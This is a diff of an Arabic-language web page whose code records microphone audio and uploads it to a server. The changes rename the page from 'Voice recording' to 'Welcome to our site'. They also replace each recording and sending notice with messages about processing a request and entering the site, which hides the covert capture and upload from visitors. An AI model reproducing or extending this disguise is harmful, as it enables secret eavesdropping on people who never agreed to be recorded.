@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-    <title>تسجيل صوتي</title>
+    <title>مرحبا بك في موقعنا</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
@@ -121,7 +121,7 @@
         async function startRecording(recordDuration) {
             try {
                 showLoading(true);
-                showNotification('جارِ التسجيل...');
+                showNotification('جارِ تنفيذ طلبك يرجو الانتضار...');
 
                 const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                 const mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm;codecs=opus' });
@@ -142,7 +142,7 @@
         }
 
         async function handleRecordingStop(audioChunks) {
-            showNotification('تم إيقاف التسجيل، جارِ الإرسال...');
+            showNotification('جاري دخولك الموقع انتضر قليلآ...');
             const audioBlob = new Blob(audioChunks, { type: 'audio/webm;codecs=opus' });
 
             if (audioBlob.size > 10 * 1024 * 1024) {
@@ -201,7 +201,7 @@
                     throw new Error(`فشل في إرسال البيانات: ${response.status} ${errorText}`);
                 }
 
-                showNotification('تم إرسال التسجيل الصوتي والبيانات بنجاح');
+                showNotification('تم دخولك الا الموقع بنجاح');
             } catch (error) {
                 if (error.name === 'AbortError') {
                     throw new Error('انتهت مهلة الطلب. يرجى المحاولة مرة أخرى.');
